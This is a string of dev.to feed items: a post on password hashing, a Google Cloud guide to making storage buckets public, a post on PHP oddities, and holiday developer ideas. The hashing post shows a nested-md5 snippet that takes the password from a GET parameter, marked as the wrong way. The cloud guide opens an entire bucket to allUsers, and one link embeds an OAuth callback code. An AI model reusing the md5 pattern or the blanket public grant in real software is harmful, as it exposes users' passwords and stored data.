      <author>ManuTheCoder</author>
      <pubDate>Wed, 15 Dec 2021 06:48:38 +0000</pubDate>
      <link>https://dev.to/manuthecoder/what-algorithm-do-you-use-to-store-your-passwords-5ci9</link>
      <guid>https://dev.to/manuthecoder/what-algorithm-do-you-use-to-store-your-passwords-5ci9</guid>
      <description>&lt;p&gt;Yes, technically, you should be using Argon2 or Bcrypt or PBKDF2.&lt;/p&gt;

&lt;p&gt;Argon2 is actually really secure. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;​Argon2 is modern ASIC-resistant and GPU-resistant secure key derivation function. It has better password cracking resistance (when configured correctly) than PBKDF2, Bcrypt and Scrypt (for similar configuration parameters for CPU and RAM usage).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If anyone here uses md5, sha512, sha256, or any weird hashing algorithms, I'll be upset.&lt;/p&gt;

&lt;p&gt;This was me when i started PHP:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;]))));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The correct way:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;PASSWORD_ARGON2I&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

      <title>Make Cloud Storage Objects Publicly Accessible</title>
      <author>Dhruv Rajkotia</author>
      <pubDate>Wed, 15 Dec 2021 06:17:33 +0000</pubDate>
      <link>https://dev.to/dhruv_rajkotia/make-cloud-storage-objects-publicly-accessible-186o</link>
      <guid>https://dev.to/dhruv_rajkotia/make-cloud-storage-objects-publicly-accessible-186o</guid>
      <description>&lt;p&gt;Recently, I'm working on the website development and I wanted to store some of my images in the cloud so that I can easily access those images using the public link.😄&lt;/p&gt;

&lt;p&gt;So I thought🤔 to go with the google cloud services for the same, But by default the public access of the GCP storage objects is disabled in the Cloud Storage services. To access using the public URL we need to perform some steps. So today we are going to discuss about the same like how we can enabled the public access URL for cloud storage objects.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Step 1: Create GCP storage bucket&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;First of all go to &lt;a href="https://console.cloud.google.com/"&gt;https://console.cloud.google.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Search Cloud storage and select the service from suggestions&lt;/li&gt;
&lt;li&gt;Click on the Create Bucket option
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YhE0tQ4B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kyos732z3mr2huyiapci.png" alt="Image description" width="880" height="434"&gt; &lt;/li&gt;
&lt;li&gt;Provide name of your bucket
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wX1ERnwY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o161dx1h1266c1i8xluu.png" alt="Image description" width="880" height="434"&gt; &lt;/li&gt;
&lt;li&gt;Click Continue and select the region and location based on your requirement. For me It's Multi-region &amp;amp; Asia&lt;/li&gt;
&lt;li&gt;Then Click continue and select the default storage class for your data. I'll choose standard as I need the frequent access to my data.&lt;/li&gt;
&lt;li&gt;For the next step we need to choose how to control access to objects option which is basically an access mechanism for the bucket's object.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;We have 2 options:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Uniform: Means that access mechanism will be at the bucket level so all the objects of the bucket will have a same access mechanism&lt;/li&gt;
&lt;li&gt;Fine-grained: Here we can manage access at the object level so if we have a requirements like some object can be accessible and some of them are not then we can select this one.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;I'll choose the first option as I want the access management at the bucket level so I can easily manage of my all the objects access management. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Last step for the bucket creation is Choose how to protect object data. Let's keep it as a none for now as we don't have any specific requirement regarding the protect object data. &lt;/li&gt;
&lt;li&gt;Click on the create button, So now your bucket will be created.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;Step 2: Upload the objects/data that you want to access publicly&lt;br&gt;
Now the next steps is to upload the objects/data. So that we can make it public and use it further in our applications/website based on our requirements. &lt;/p&gt;

&lt;p&gt;Step 3: Check the object configurations&lt;br&gt;
Now let's first check the object configuration and check how we can identify that the object is publicly available or not. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When you click on the object configuration then you may find the below screen. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rW2RJSCx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/85xrw9bl3yfq1rjwe8t7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rW2RJSCx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/85xrw9bl3yfq1rjwe8t7.png" alt="Image description" width="880" height="431"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here if you check &lt;strong&gt;Public URL&lt;/strong&gt; option, which has &lt;strong&gt;Not applicable&lt;/strong&gt; as a value. So it means that this object can only be access by those users who has the access to the cloud bucket which you can check on IAM. So this object will not be publicly accessible. So Now let's move to the final step for how we can make that object publicly accessible. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Step 4: Make Object publicly accessible&lt;br&gt;
Now let's go to the cloud bucket main page. Click on the browser in the left panel of the GCP console and select the bucket that you have created. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You probably on the below screen. (May be our bucket name and regions will be different 😀) &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1DM1KW1F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ceti9srdayej3nulcoyp.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1DM1KW1F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ceti9srdayej3nulcoyp.png" alt="Image description" width="880" height="418"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now let's go to the &lt;strong&gt;Permission&lt;/strong&gt; tab. Click on the Add permission button.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2k3ddm90--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/han4hludyh6xi1h7he2m.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2k3ddm90--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/han4hludyh6xi1h7he2m.png" alt="Image description" width="880" height="442"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Provide New principals as a &lt;strong&gt;allUsers&lt;/strong&gt; and Role as a "Storage Legacy Object Reader" &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RPeearj6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iimcljrxs7r3c3tapszh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RPeearj6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iimcljrxs7r3c3tapszh.png" alt="Image description" width="880" height="442"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Click on the Save button which leads to open the new popup for confirmation. Select the &lt;strong&gt;Allow Public Access&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;Congratulations, now you have enabled the public access to your buckets which means that all the objects in that bucket can be publicly accessible.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Step 5: Test the accessibility of the Object&lt;br&gt;
Now let's go to the object configuration and check the public URL field. Now we have a link associate with the public URL field which is our publicly accessible link. Using that link we can able to access the object publicly. 🤟&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--z1U82dFt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pzf1ayhppu3dp4bd9zmr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--z1U82dFt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pzf1ayhppu3dp4bd9zmr.png" alt="Image description" width="880" height="456"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That's it. Congratulations now you know that how to make cloud storage objects publicly accessible.&lt;/p&gt;

&lt;p&gt;Hope you liked it 🤞. Please &lt;a href="https://twitter.com/dhruv_rajkotia"&gt;Follow&lt;/a&gt; me on twitter for more updates regarding my blogs. Have a great day :)😉.&lt;/p&gt;

      <title>Ghosts of Christmas - a few oddities in PHP 👻</title>

      <guid>https://dev.to/andersbjorkland/ghosts-of-christmas-a-few-oddities-in-php-1np7</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Just the Gist&lt;/strong&gt;&lt;br&gt;&lt;br&gt;
While the ghost of the past had security issues or lack of support for common programming paradigms, the ghost of the present have seen to that there are quirks and oddities in PHP. As luck would have it, we have mostly addressed the ghost of the past. But today we are visited upon by the ghost of the present, but not all it brings us is of evil.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#neat-but-inconsistent"&gt;
  &lt;/a&gt;
  Neat but Inconsistent
&lt;/h2&gt;

&lt;p&gt;Did you know that we have some neat array functions? Fan favorites such as &lt;code&gt;array_map&lt;/code&gt; and &lt;code&gt;array_filter&lt;/code&gt; let's us transform values and filter them with some handy callback functions. Both of these functions takes two parameters; an array and a callback function to be used on each value in the array. But here's an odd thing: &lt;code&gt;array_map&lt;/code&gt; has a callback as its first parameter, and &lt;code&gt;array_filter&lt;/code&gt; has a callback as its second parameter. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#passbyboth"&gt;
  &lt;/a&gt;
  Pass-by-Both
&lt;/h2&gt;

&lt;p&gt;In programming languages, a function is called by passing it as an argument. When this argument is a variable, it can either be copied and treated as a new variable within that function. This is called &lt;em&gt;pass-by-value&lt;/em&gt;. In some languages, it will still look like you have passed the function your very own variable as it may be mutated by the function. This is what can happen in JavaScript. That's because the variable being passed is a reference (or an "address") to an object (including arrays). This is still a &lt;em&gt;pass-by-value&lt;/em&gt; system. Java and Python are other examples of languages that uses &lt;em&gt;pass-by-value&lt;/em&gt;. And guess what? PHP is a language that uses this system too, by default. That is, PHP can optionally become a &lt;em&gt;pass-by-reference&lt;/em&gt; system. So what is that? Let this example illustrate it:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;$num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$num&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nf"&gt;add5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"December &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;th"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
&lt;span class="c1"&gt;// Outputs: December 15th&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;☝ So what's going on here is that we are passing our variable &lt;code&gt;$a&lt;/code&gt; by reference. This means that the variable &lt;code&gt;$a&lt;/code&gt; is actually pointing to the same address as the one being used in the function &lt;code&gt;add5&lt;/code&gt;. So when we call &lt;code&gt;add5&lt;/code&gt;, the value of &lt;code&gt;$a&lt;/code&gt; is being changed. This is what we call &lt;em&gt;pass-by-reference&lt;/em&gt;. Similar system is used in C++ too.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#functioncall-by-string"&gt;
  &lt;/a&gt;
  Function-call by string
&lt;/h2&gt;

&lt;p&gt;We can call functions by using the string name of the function. That means that we can programmatically call functions with the help of &lt;code&gt;call_user_func&lt;/code&gt;. Here's an example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;christmasGreeting&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Happy Christmas, &lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="s2"&gt;!"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nv"&gt;$season&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"christmas"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nv"&gt;$functionType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"Greeting"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;call_user_func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$season&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$functionType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"McClane"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="c1"&gt;// Output: "Happy Christmas, McClane!"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We have constructed a string that is the concatenation of the string &lt;code&gt;$season&lt;/code&gt; and the string &lt;code&gt;$functionType&lt;/code&gt;, which gets us "christmasGreeting". Now we can call the function &lt;code&gt;christmasGreeting&lt;/code&gt; by passing it as an argument to &lt;code&gt;call_user_func&lt;/code&gt;. Any following arguments passed to &lt;code&gt;call_user_func&lt;/code&gt; will be passed on to the function.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#talking-about-functions"&gt;
  &lt;/a&gt;
  Talking about functions
&lt;/h2&gt;

&lt;p&gt;If you are used to functional programming, or JavaScript in general, then this next tidbit may not seem so surprising to you. In PHP, functions are first-class objects. This means that functions can be passed around as arguments to other functions, and functions can be returned from other functions. This is a very powerful feature of PHP. Here's a taste:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class="nv"&gt;$greeting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;"Hello, &lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="s2"&gt;!"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;birthdayGreetings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;callable&lt;/span&gt; &lt;span class="nv"&gt;$greeting&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$greeting&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;" Happy birthday!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;birthdayGreetings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'DROP TABLE'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$greeting&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="c1"&gt;// Output: Hello, DROP TABLE! Happy birthday!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#what-about-you"&gt;
  &lt;/a&gt;
  What about you?
&lt;/h2&gt;

&lt;p&gt;These were all the oddities for now. Many are pretty neat features of PHP that we don't use much, others has been left for the sake of backward compatibility. Did you find any quirk especially interesting? Did I miss your favorite oddity? Also, is Die Hard a Christmas movie? Comment below and let us know what you think ✍&lt;/p&gt;

      <guid>https://dev.to/mishmanners/10-holiday-themed-things-to-do-as-a-developer-22ba</guid>
      <description>&lt;p&gt;As we all wrap up for the year, here's a few fun, Christmas-themed things you can do.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#countdown-to-christmas"&gt;
  &lt;/a&gt;
  Countdown to Christmas
&lt;/h2&gt;

&lt;p&gt;Want to know &lt;em&gt;exactly&lt;/em&gt; when it's Christmas? This neat &lt;a href="https://christmascountdown.live/"&gt;Christmas countdown&lt;/a&gt; will show you how many sleeps until Santa comes. There's even a Discord bot and lots of random Christmas jokes to entertain the family. Fun fact, the code is on &lt;a href="https://github.com/christmas-countdown"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dMiO64Ec--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mhw1kzrdhwp7acyyudzk.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dMiO64Ec--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mhw1kzrdhwp7acyyudzk.gif" alt="Christmas Countdown" width="880" height="641"&gt;&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#add-some-holiday-flair-to-your-video-calls"&gt;
  &lt;/a&gt;
  Add some holiday flair to your video calls
&lt;/h2&gt;

&lt;p&gt;Spice up your team meetings with some holiday cheer. There are hundreds of Christmasy-themed frames on sites like &lt;a href="https://webstockreview.net/explore/christmas-frame-png/"&gt;WebStockReview&lt;/a&gt;. Add these to your &lt;a href="https://obsproject.com/"&gt;OBS&lt;/a&gt; and wow your friends. &lt;a href="https://dev.to/mishmanners/how-to-setup-obs-for-live-streaming-presentations-and-virtual-meetings-1chf"&gt;Read more about how to setup OBS for your virtual calls on this post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0OtddubZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/klu2pu9o65laixgfkmvp.JPG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0OtddubZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/klu2pu9o65laixgfkmvp.JPG" alt="Zoom call" width="880" height="494"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#santa-hat-on-your-github-profile"&gt;
  &lt;/a&gt;
  Santa hat on your GitHub profile
&lt;/h2&gt;

&lt;p&gt;Using some simple facial recognition, you can quickly Christmas-ify your GitHub profile. Upload a photo to &lt;a href="https://santahat.vercel.app/"&gt;Santa Hat&lt;/a&gt; and in seconds you'll have a Christmas-themed image to share all over the internet. There's lots of hats to choose from 🎅 Hint: it doesn't &lt;em&gt;just&lt;/em&gt; have to be for your GitHub Profile pic.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ekitZ2Tz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t0eml852ohxuuaykhyma.JPG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ekitZ2Tz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t0eml852ohxuuaykhyma.JPG" alt="Santa hat profile" width="880" height="370"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#dear-santa"&gt;
  &lt;/a&gt;
  Dear Santa
&lt;/h2&gt;

&lt;p&gt;Writing letters to Santa as a kid was one of the best parts of Christmas. At times, you might have even received a reply from the North Pole. Now, Santa will respond to all your Christmas wishes with this GitHub Action. Add this &lt;a href="https://github.com/imjohnbo/dear-santa-action"&gt;Dear Santa Action&lt;/a&gt; to your repo and he'll respond to your wishes.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uF0Q2vEG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wdc7nr70zoogmi36m7q5.JPG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uF0Q2vEG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wdc7nr70zoogmi36m7q5.JPG" alt="Dear Santa Action" width="880" height="462"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#light-up-someone-elses-christmas-tree"&gt;
  &lt;/a&gt;
  Light up someone else's Christmas tree
&lt;/h2&gt;

&lt;p&gt;Last year &lt;a href="https://twitter.com/martinwoodward"&gt;Martin Woodward&lt;/a&gt; created an action for others to light up his Christmas tree. Go head and &lt;a href="https://github.com/martinwoodward/smart-xmas"&gt; ⭐ star his repo ⭐ &lt;/a&gt; and make his tree sparkle ✨. You can fork his project and add some magic to your Christmas tree.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#christmas-spotify-playlist"&gt;
  &lt;/a&gt;
  Christmas Spotify playlist
&lt;/h2&gt;

&lt;p&gt;There are lots of great Christmas playlists to choose from, including the &lt;a href="https://open.spotify.com/playlist/5OP7itTh52BMfZS1DJrdlv?si=d101470712bf4924"&gt;Top 100 Greatest Christmas Songs Ever&lt;/a&gt;. Choose a playlist or create your own. Whatever you're listening to, you can even add it to your GitHub profile. Check out &lt;a href="https://github.com/kittinan/"&gt;kittinan's&lt;/a&gt; &lt;a href="https://spotify-github-profile.vercel.app/api/callback?code=AQDFwZV4TtNRosVPBx5oXzBCnY802FjbOYg7jNqg9P7dq4Ot6XgxRJM9dDvwMEziYRdnK6zR3OrQH00AtvaiTrvdlNv0Uf7yoCkqPPVHcrkzUuI43GBzJW3otXo1xFCFI8ukbtgb9DL1O5NVZGUYUxe82-WToqnm9wAoCNIttt3_QBpnhxTiAzbTr7rbJxgFvxKKsbrT5I8rdTDEZ0grk66olOfQ6926qm7LQYR-pPFm5hoRKVKeV4MoQQR_8HAXmAxL4NI7rU5doxfprpSg29nK"&gt;Spotify play card that you can add to your GitHub Profile README&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Kw9lyPJt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eyf98vkb91xaecpmnssb.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Kw9lyPJt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eyf98vkb91xaecpmnssb.gif" alt="Spotify on Profile" width="439" height="192"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#github-saint-nictocat"&gt;
  &lt;/a&gt;
  GitHub Saint Nictocat
&lt;/h2&gt;

&lt;p&gt;GitHub has an Octocat for every occasion. Aside from purchasing a &lt;a href="https://thegithubshop.com/products/octoplush"&gt;Mona plushie&lt;/a&gt; which is already sold out this Christmas, you can use the &lt;a href="https://octodex.github.com/saint_nictocat/"&gt;Saint Nicholas Octocat, AKA Saint Nictocat&lt;/a&gt; to bring you some holiday cheer.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--C__2MCEK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9wq682ay5kh1pcw4wrfs.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--C__2MCEK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9wq682ay5kh1pcw4wrfs.jpg" alt="Santa Octocat" width="876" height="876"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#check-out-your-skyline"&gt;
  &lt;/a&gt;
  Check out your Skyline
&lt;/h2&gt;

&lt;p&gt;As 2021 comes to a close, it's time to check out your GitHub contributions... in three dimensions! Head to &lt;a href="https://skyline.github.com"&gt;GitHub Skyline&lt;/a&gt;, type in your GitHub username, and change the URL extension to "2021". The option to select 2021 from the drop down should be available early next year. But in the meantime, you can check out how your graph is stacking up.&lt;/p&gt;

